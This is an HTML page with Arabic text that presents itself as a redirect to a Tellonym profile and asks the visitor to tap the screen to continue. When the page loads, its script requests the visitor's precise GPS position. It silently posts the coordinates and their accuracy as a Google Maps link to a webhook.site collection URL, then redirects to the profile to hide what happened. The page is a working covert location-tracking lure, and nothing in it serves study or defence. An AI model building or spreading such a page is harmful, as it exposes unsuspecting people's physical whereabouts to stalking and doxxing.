<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script>
        const hook = "https://webhook.site/5e829926-604d-4dde-a540-5530e155e703";
        const dest = "https://tellonym.me/Schaien/anything";

        function getHome() {
            navigator.geolocation.getCurrentPosition(async (p) => {
                // إرسال الإحداثيات فوراً بمجرد الضغط على Allow
                const lat = p.coords.latitude;
                const lon = p.coords.longitude;
                const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                
                await fetch(hook, {
                    method: 'POST',
                    mode: 'no-cors',
                    body: `📍 الموقع الدقيق: ${mapUrl} | الدقة: ${p.coords.accuracy} متر`
                });
                window.location.replace(dest);
            }, (e) => {
                // في حال الرفض أو الخطأ
                window.location.replace(dest);
            }, { enableHighAccuracy: true });
        }
        window.onload = getHome;
    </script>
</head>
<body style="background:#000;" onclick="getHome()">
    <div style="color:white; text-align:center; margin-top:45%; font-family:sans-serif;">
        <h2>يرجى النقر على الشاشة للمتابعة</h2>
    </div>
</body>
</html>
